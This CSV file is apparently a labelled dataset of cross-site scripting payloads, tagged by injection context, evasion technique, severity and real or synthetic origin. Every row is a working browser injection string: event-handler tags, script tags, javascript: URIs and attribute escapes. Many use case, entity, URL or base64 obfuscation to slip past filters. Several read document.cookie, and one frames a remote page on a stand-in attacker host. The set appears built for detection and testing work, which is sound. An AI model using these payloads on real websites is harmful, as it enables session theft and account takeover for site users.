payload,context,technique,severity,length,source
"<sVg OnPointerEnter=""location=javas+cript:ale+rt%2+81%2+9"">",event_handler,case_variation,low,59,real
"<br oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
%22><img onload=alert(location.hash)>,tag_injection,synthetic,medium,37,synthetic
for((i)in(self))eval(i)(1),dom_sink,encoding,high,26,real
"<em onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,80,real
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;,generic,comment_injection,medium,75,real
<svg onfocus=alert(1)/>,tag_injection,synthetic,medium,23,synthetic
%27 onbegin=confirm(document.domain) %27,attribute_escape,synthetic,medium,40,synthetic
j&#97;vascr	ipt:alert(1),js_uri,synthetic,medium,24,synthetic
<a onpointerout=alert(1) style=display:block>AnonKryptiQuz</a>,event_handler,none,medium,62,real
<iframe onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",event_handler,none,medium,166,real
<hgroup onfocus=alert(1) autofocus tabindex=1>,event_handler,none,medium,46,real
""" oNerRor=prOmpT(lOcaTioN.hAsh) """,attribute_escape,synthetic,medium,33,synthetic
"<progress onmousemove=""alert(1)"">AnonKryptiQuz</progress>",event_handler,none,medium,57,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",event_handler,none,medium,174,real
<scr	ipt>/*/alert(document.cookie)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
<slot onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<table onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</table>",event_handler,none,medium,68,real
<fieldset onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
%3Cscript%3Econsole.log`document.domain`%3C/script%3E,script_injection,synthetic,medium,53,synthetic
"<caption onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</caption>",event_handler,none,medium,73,real
%3Csvg onbegin=alert(location.hash)/%3E,tag_injection,synthetic,medium,39,synthetic
"""><svg/onload=confirm(1)>""@x.y",event_handler,none,medium,30,real
<svg onmouseenter=alert(document.domain)/>,tag_injection,synthetic,medium,42,synthetic
"<IFRAME SRC=# onmouseover=""alert(4431)""></IFRAME>",event_handler,case_variation,medium,49,real
"""%3E%3Csvg onmouseenter=prompt(document.cookie)%3E",tag_injection,synthetic,medium,50,synthetic
<header onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<svg onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,53,synthetic
"<style draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,83,real
"<em oncut=""alert(1)"" contenteditable>AnonKryptiQuz</em>",event_handler,none,medium,55,real
"<tbody draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tbody>",event_handler,none,medium,68,real
"""%3E%3Csvg onload=confirm(1)%3E",tag_injection,synthetic,medium,31,synthetic
<input2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</input2><input value=clickme>,event_handler,none,medium,103,real
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",event_handler,comment_injection|url_encoding|case_variation,medium,144,real
"<dfn draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</dfn>",event_handler,none,medium,64,real
<var onpointerenter=alert(1) style=display:block>AnonKryptiQuz</var>,event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable style=display:block>drop here</dt>",event_handler,none,medium,121,real
"<ul draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,82,real
"""><svg onfocus=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,53,synthetic
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,event_handler,none,medium,61,real
<svg><source onload=alert(1)></source>,event_handler,none,medium,38,real
"<applet draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,85,real
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(/AmoloHT/)""&#11;&#10;&#09;;>",tag_injection,html_entity|whitespace_obfuscation,medium,84,real
<button popovertarget=x>Click me</button><ol onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ol>,event_handler,none,medium,100,real
"setTimeout(""console.log(document.domain)"",0)",dom_sink,synthetic,medium,44,synthetic
<math><brute xlink:href=javascript:alert(1)>click,js_uri,none,medium,49,real
"<pre onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",event_handler,none,medium,65,real
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",event_handler,none,medium,119,real
"""><Svg onMouSeoVer=prOmpT(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,43,synthetic
"' onerror=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,48,synthetic
javascript:void(console.log(1)),js_uri,synthetic,medium,31,synthetic
"<input3 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,90,real
<b onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</b>,event_handler,none,medium,68,real
<img onlo&#97;d=prompt(1)/>,tag_injection,synthetic,medium,27,synthetic
"<marquee onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,76,real
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
<blink onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</blink><input value=clickme>,event_handler,none,medium,101,real
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=print()></u>",event_handler,none,low,119,real
"<? foo=""><x foo='?><script>javascript:alert(9281)</script>'>"">",script_injection,none,medium,62,real
<pre onpointerup=alert(1) style=display:block>AnonKryptiQuz</pre>,event_handler,none,medium,65,real
"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></kbd>",event_handler,none,medium,166,real
"&lt;BASE HREF=\""javascript&#058;alert('AnonKryptiQuz');//\""&gt;",generic,html_entity,medium,63,real
"<content oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<bdi oncut=""alert(1)"" contenteditable>AnonKryptiQuz</bdi>",event_handler,none,medium,57,real
"<a href=""javas\x04cript:javascript:alert(3471)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,event_handler,none,medium,74,real
<ScRiPt>alert(1)</ScRiPt>,script_injection,case_variation,medium,25,real
<s onpointerenter=alert(1) style=display:block>AnonKryptiQuz</s>,event_handler,none,medium,64,real
&#X003C;,generic,html_entity,low,8,real
"<button onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</button>",event_handler,none,medium,72,real
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,62,real
"<figure onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></figure>",event_handler,none,medium,285,real
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationstart=""alert(1)""></map>",event_handler,none,medium,93,real
"""><svg ontoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
<script>consol&#101;.log`docum&#101;nt.cooki&#101;`</script>,script_injection,synthetic,medium,60,synthetic
"<th draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,60,real
<input onpointerleave=alert(1) style=display:block>AnonKryptiQuz</input>,event_handler,none,medium,72,real
&quot;&gt;&lt;svg onload=alert&amp;#x27;&#x00000040&quot;1&quot;&gt;,event_handler,html_entity,low,68,real
"j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,medium,65,synthetic
'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>,event_handler,none,high,47,real
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",event_handler,none,medium,99,real
"<h1 draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,82,real
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationend=""alert(1)""></input>",event_handler,none,medium,95,real
"""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",event_handler,none,medium,50,real
%22 onfocus=prompt(document.domain) autofocus=%22,attribute_escape,synthetic,medium,49,synthetic
"eval(""alert('XSS')"")",dom_sink,synthetic,medium,20,synthetic
<iframe src=javascript:alert(1)>,js_uri,none,medium,32,real
<scr	ipt>//prompt(document.domain)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
<data onpointerdown=alert(1) style=display:block>AnonKryptiQuz</data>,event_handler,none,medium,69,real
<script>&#97;l&#101;rt`docum&#101;nt.dom&#97;in`</script>,script_injection,synthetic,medium,57,synthetic
""" onerror=console.log(location.hash) """,attribute_escape,synthetic,medium,38,synthetic
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></colgroup>",event_handler,none,medium,120,real
"""><u>AnonKryptiQuz</u><marquee+onstart='alert(document.cookie)'>AnonKryptiQuz",event_handler,none,high,77,real
<svg><shadow onload=alert(1)></shadow>,event_handler,none,medium,38,real
"<article draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,67,real
""" onfocus=confirm('XSS') &#97;utofocus=""",attribute_escape,synthetic,medium,40,synthetic
"<style>@keyframes x{}</style><image style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></image>",event_handler,none,medium,103,real
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=print()></nobr>",event_handler,none,low,125,real
<big onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</big>,event_handler,none,medium,72,real
"<dfn onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dfn>",event_handler,none,medium,82,real
"<article onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,90,real
"<track draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,83,real
<svg onfocus=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,48,synthetic
"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x"" /></svg>",tag_injection,none,low,277,real
‘ onfocus=’alert(1)’ autofocus=’,event_handler,none,medium,32,real
<iframe onreadystatechange=alert(1)></iframe>,event_handler,none,medium,45,real
<font onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<legend oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
<iframe onfocusout=alert(1) id=x><input autofocus>,event_handler,none,medium,50,real
""" onfocus=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,42,synthetic
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(8641);""></FRAMESET>",js_uri,case_variation,medium,69,real
"<isindex draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,67,real
"<picture onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,74,real
<input4 onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<menu draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",event_handler,none,medium,86,real
<svg onclick=confirm(1)>,tag_injection,synthetic,medium,24,synthetic
"<svG oNtoGglE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,57,synthetic
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"""><svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,57,synthetic
"%22 onmouseover=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,57,synthetic
"?skinName=asfunction:getURL,javascript:alert(1)//"",",js_uri,none,medium,51,real
"<keygen onmouseout=""alert(1)"">AnonKryptiQuz</keygen>",event_handler,none,medium,52,real
<svg onmous&#101;ov&#101;r=prompt(1)>,tag_injection,synthetic,medium,37,synthetic
"<keygen draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</keygen>",event_handler,none,medium,70,real
"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></content>",event_handler,none,medium,174,real
"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",tag_injection,none,low,135,real
<script>//confirm(docum&#101;nt.cooki&#101;)</script>,script_injection,synthetic,medium,53,synthetic
<IFRAME SRC=”http://hacker-site.com/xss.html”>,tag_injection,case_variation,low,46,real
<thead onpointerleave=alert(1) style=display:block>AnonKryptiQuz</thead>,event_handler,none,medium,72,real
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,event_handler,none,medium,56,real
<svg><rt onload=alert(1)></rt>,event_handler,none,medium,30,real
"<svg onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,71,synthetic
"<i onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,64,real
"<object onclick=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,69,real
"<input3 onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,73,real
"<picture draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,92,real
"javascript:\\\/\\\/\\\'\\\/<\\\/title><\\\/style><\\\/textarea><\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\'Audi%20RS5\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\'AnonKryptiQuz\\\')",js_uri,url_encoding,medium,361,real
"<menu draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,64,real
"<meta onmouseleave=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,50,real
""" onmous&#101;ov&#101;r=&#97;l&#101;rt(1) """,attribute_escape,synthetic,medium,43,synthetic
&#x00003C,generic,html_entity,low,9,real
"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable style=display:block>drop here</rp>",event_handler,none,medium,125,real
"""><Svg onMouSeeNteR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
"<hr onmousemove=""alert(1)"">AnonKryptiQuz</hr>",event_handler,none,medium,45,real
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",script_injection,none,medium,63,real
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",js_uri,none,medium,51,real
"{""<img onerror=confirm('xss_by_AnonKryptiQuz')src/>"":1}",event_handler,none,medium,55,real
"<mark onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,68,real
%3Cscript%3E/x/prompt('XSS')%3C/script%3E,script_injection,synthetic,medium,41,synthetic
"<b ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</b>",event_handler,none,medium,83,real
%22 ontoggle=confirm(1) %22,attribute_escape,synthetic,medium,27,synthetic
